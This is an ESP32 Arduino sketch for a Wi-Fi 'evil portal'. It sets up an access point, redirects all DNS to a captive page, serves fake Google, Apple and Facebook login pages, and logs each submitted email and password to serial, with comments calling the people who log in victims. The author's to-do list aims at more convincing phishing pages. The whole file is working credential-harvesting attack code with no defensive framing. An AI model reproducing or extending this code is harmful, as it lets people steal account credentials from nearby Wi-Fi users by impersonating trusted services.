/* 
to do
  1.) use of POST instead of get 
  2.) Use happy colors 4 more a more positive energy (for now try blue and peach) yellow, orange, pink, red, peach, light pink and lilac.
  3. "Forgot Apple ID or Password" and "Create yours now" buttons need to be redirecred somwwhere
  4. Continous Study >>> https://github.com/bigbrodude6119/flipper-zero-evil-portal/blob/main/esp32/EvilPortal/EvilPortal.ino

*/


  // ˗ˏˋ 𒉭  Dynamic captive portal  𒉭 ˊˎ˗

//Define libraries & variables
#include <DNSServer.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include "ESPAsyncWebServer.h"
#include "FS.h"
#include <LittleFS.h>

// eSrver related variables
DNSServer dnsServer;
AsyncWebServer server(80);
 
// Need to change this to match my intentions 
String email; // email
String passwd; // pass
bool email_received = false;
bool passwd_received = false;

// Handle requests
class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request){
    //request->addInterestingHeader("ANY");
    return true;
  }

  void handleRequest(AsyncWebServerRequest *request) {
    request->send(LittleFS, "/index.html", "text/html");
  }
};

void setupServer() {
  // 2Serve 
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/index.html", "text/html");
    Serial.println("Client Connected");
  });

  // 2 redirection of the initial internet request
  server.onNotFound([](AsyncWebServerRequest *request){
      request->send(LittleFS, "/index.html", "text/html");
      Serial.println(" Serving... ( -_•)▄︻デ══━一");
  });

  // Route to load style.css file
  server.on("/all.mini.CSS", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/style.css", "text/css");
  });

  // Serve other pages
  server.on("/google", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/google.html", "text/html");
  });

  server.on("/apple", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/apple.html", "text/html");
  });

  server.on("/facebook", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/facebook.html", "text/html");
  });

  server.on("/warning", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(LittleFS, "/warning.html", "text/html"); 
  });

  // Handle unknown requests (default to index.html for captive portal)
  server.onNotFound([](AsyncWebServerRequest *request){
    request->send(LittleFS, "/index.html", "text/html");
    Serial.println("Serving fallback index.html");
  });

  // Receive and process user input (Backend handling)
    // Retrive via GET changing to POST soon
  server.on("/get", HTTP_GET, [] (AsyncWebServerRequest *request) {
    String inputMessage;
    
    // Capture email
    if (request->hasParam("email")) {
      inputMessage = request->getParam("email")->value();
      email = inputMessage;
      Serial.println("Captured Email: " + inputMessage);
      email_received = true;
    }
    
    // Capture Passwd
    if (request->hasParam("passwd")) {
      inputMessage = request->getParam("passwd")->value();
      passwd = inputMessage;
      Serial.println("Captured Password: " + inputMessage);
      passwd_received = true;
    }

    request->send(LittleFS, "/warning.html", "text/html");
  });
}

void setup(){
  // 0ther setup stuff...
  Serial.begin(115200);
  Serial.println();

  // start SPIFFS
  if (!LittleFS.begin(true)){
    Serial.print("LittleFS FAILED!");
    return;    
  }
  Serial.println("LittleFS mount successful");

  // AP set up & dns
  Serial.println("Setting up AP Mode");
  WiFi.mode(WIFI_AP); 
  WiFi.softAP("youreCook3d2", "12345678");
  Serial.print("AP IP address: ");Serial.println(WiFi.softAPIP());
  Serial.println("Setting up Async WebServer");
  setupServer();

  Serial.println("Starting DNS Server");
  dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);//only when requested from AP
  // more handlers...
  server.begin();
  Serial.println("All Done!");

  if(email_received && passwd_received){
      Serial.print("Captured Email: ");Serial.println(email);
      Serial.print("Captured Passwd ");Serial.println(passwd);
      email_received = false;
      passwd_received = false;
      Serial.println("We'll wait for the next Victim now: ");
    }
}

void loop(){
  dnsServer.processNextRequest();
}
